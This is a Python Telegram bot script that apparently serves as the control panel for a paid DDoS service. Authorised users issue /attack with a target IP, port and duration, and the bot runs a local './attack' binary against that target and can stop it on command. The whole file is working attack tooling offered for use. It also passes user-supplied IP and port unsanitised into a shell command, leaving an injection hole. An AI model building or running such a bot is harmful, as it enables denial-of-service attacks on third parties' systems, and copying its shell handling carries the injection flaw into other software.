import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = 'Apna Bot ka token dal'
ADMIN_USER_ID = apna id dal
USERS_FILE = 'users.txt'

# NEOVERSE_M_BREACH ka paid ddos hai
user_attack_status = {}

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the Ddos Bot 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    
    if user_id == str(ADMIN_USER_ID):
        message = (
            "*👑 Owner Commands 👑*\n\n"
            "/add <id> - Add user\n"
            "/remove <id> - Remove user\n"
            "/help - Show this menu\n\n"
            "*User Commands:*\n"
            "/attack <ip> <port> <duration> - Start attack\n"
            "/stop - Stop ongoing attack"
        )
    else:
        message = (
            "*📱 User Commands 📱*\n\n"
            "/attack <ip> <port> <duration> - Start attack\n"
            "/stop - Stop ongoing attack"
        )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def add_user(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id != str(ADMIN_USER_ID):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You are not authorized to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /add <user_id>*", parse_mode='Markdown')
        return

    target_user_id = args[0].strip()
    users.add(target_user_id)
    save_users(users)
    await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} added successfully.*", parse_mode='Markdown')

async def remove_user(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id != str(ADMIN_USER_ID):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You are not authorized to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
        return

    target_user_id = args[0].strip()
    users.discard(target_user_id)
    save_users(users)
    await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} removed successfully.*", parse_mode='Markdown')

async def stop_attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You are not authorized to use this bot.*", parse_mode='Markdown')
        return

    if not user_attack_status.get(user_id, False):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No ongoing attack to stop.*", parse_mode='Markdown')
        return

    # Cancel the attack task
    task = user_attack_status.get(f"{user_id}_task")
    if task:
        task.cancel()
    
    user_attack_status[user_id] = False
    if f"{user_id}_task" in user_attack_status:
        del user_attack_status[f"{user_id}_task"]
    
    await context.bot.send_message(chat_id=chat_id, text="*🛑 Attack stopped by user!*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context, user_id):
    attack_process = None
    try:
        # Store the task reference
        current_task = asyncio.current_task()
        user_attack_status[f"{user_id}_task"] = current_task
        
        attack_process = await asyncio.create_subprocess_shell(
            f"./attack {ip} {port} {duration} 10",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        # Wait for attack to complete or be cancelled
        try:
            stdout, stderr = await attack_process.communicate()
            if stdout:
                print(f"[stdout]\n{stdout.decode()}")
            if stderr:
                print(f"[stderr]\n{stderr.decode()}")
        except asyncio.CancelledError:
            # Attack was stopped by user
            if attack_process and attack_process.returncode is None:
                attack_process.terminate()
                await attack_process.wait()
            raise

    except asyncio.CancelledError:
        await context.bot.send_message(chat_id=chat_id, text="*🛑 Attack was stopped!*", parse_mode='Markdown')
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error: {str(e)}*", parse_mode='Markdown')
    finally:
        user_attack_status[user_id] = False
        if f"{user_id}_task" in user_attack_status:
            del user_attack_status[f"{user_id}_task"]
        # Only send completion message if not cancelled and no error
        if user_attack_status.get(user_id) is not False or user_attack_status.get(user_id) is None:
            pass  # completion message already sent in cancellation case

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You are not authorized to use this bot.*", parse_mode='Markdown')
        return

    if user_attack_status.get(user_id, False):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Attack already in progress! Use /stop to stop it.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    
    # Validate duration
    try:
        duration_int = int(duration)
        if duration_int <= 0:
            raise ValueError
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Duration must be a positive number!*", parse_mode='Markdown')
        return

    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*Use /stop to stop the attack*"
    ), parse_mode='Markdown')

    user_attack_status[user_id] = True
    asyncio.create_task(run_attack(chat_id, ip, port, duration, context, user_id))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("stop", stop_attack))
    application.add_handler(CommandHandler("attack", attack))
    application.run_polling()

if __name__ == '__main__':
    main()